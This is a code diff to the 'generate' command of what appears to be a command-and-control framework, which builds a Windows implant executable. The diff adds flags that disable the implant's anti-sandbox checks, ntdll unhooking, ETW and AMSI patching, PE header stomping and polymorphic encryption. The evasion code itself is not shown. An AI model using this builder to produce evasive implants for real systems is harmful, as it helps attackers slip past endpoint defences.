@@ -28,6 +28,26 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "kill_date": "",
         "magic": 0xDEADF00D,
         "output": None,
+        "no_evasion": False,
+        "no_sandbox": False,
+        "no_unhook": False,
+        "no_etw": False,
+        "no_amsi": False,
+        "no_pe_stomp": False,
+        "no_crypt": False,
+        "debug": False,
+    }
+
+    # Boolean flags (no argument following)
+    bool_flags = {
+        "--no-evasion": "no_evasion",
+        "--no-sandbox": "no_sandbox",
+        "--no-unhook": "no_unhook",
+        "--no-etw": "no_etw",
+        "--no-amsi": "no_amsi",
+        "--no-pe-stomp": "no_pe_stomp",
+        "--no-crypt": "no_crypt",
+        "--debug": "debug",
     }
 
     i = 0
@@ -48,6 +68,8 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
+        elif parts[i] in bool_flags:
+            opts[bool_flags[parts[i]]] = True; i += 1
         elif parts[i] in ("--help", "-h"):
             _print_help()
             return
@@ -98,12 +120,19 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
     console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
     if opts["kill_date"]:
         console.print(f"  Kill date: {opts['kill_date']}")
-    console.print()
 
     # Import and invoke build
     import sys
     sys.path.insert(0, str(project_root / "scripts"))
     from build_agent_c import build_agent
+
+    # Show evasion/debug flags
+    active_flags = [k for k in ("debug", "no_evasion", "no_sandbox", "no_unhook",
+                                 "no_etw", "no_amsi", "no_pe_stomp", "no_crypt")
+                    if opts[k]]
+    if active_flags:
+        console.print(f"  Flags:     {', '.join('--' + f.replace('_', '-') for f in active_flags)}")
+    console.print()
 
     try:
         exe_path = build_agent(
@@ -117,6 +146,14 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             arch=opts["arch"],
             output_path=opts["output"],
             profile_path=profile_path,
+            no_evasion=opts["no_evasion"],
+            no_sandbox=opts["no_sandbox"],
+            no_unhook=opts["no_unhook"],
+            no_etw=opts["no_etw"],
+            no_amsi=opts["no_amsi"],
+            no_pe_stomp=opts["no_pe_stomp"],
+            debug=opts["debug"],
+            no_crypt=opts["no_crypt"],
         )
         size_kb = exe_path.stat().st_size / 1024
         console.print(f"[green]✓ Agent built: {exe_path} ({size_kb:.1f} KB)[/green]")
@@ -140,8 +177,19 @@ def _print_help():
   --magic HEX           Packet magic bytes (default: 0xDEADF00D)
   --output, -o PATH     Output .exe path (default: builds/agent_ARCH.exe)
 
+[bold]Evasion / Debug:[/bold]
+  --debug               Enable agent debug log (%TEMP%\\agent_debug.log)
+  --no-crypt            Skip polymorphic encryption (raw .exe, for debugging)
+  --no-evasion          Disable ALL evasion features
+  --no-sandbox          Disable anti-sandbox checks only
+  --no-unhook           Disable ntdll unhooking only
+  --no-etw              Disable ETW patching only
+  --no-amsi             Disable AMSI patching only
+  --no-pe-stomp         Disable PE header stomping only
+
 [bold]Examples:[/bold]
   generate
   generate --url https://cdn.example.com/api/v1 --sleep 30
+  generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
   generate --arch x86 --kill-date 2026-12-31
 """)
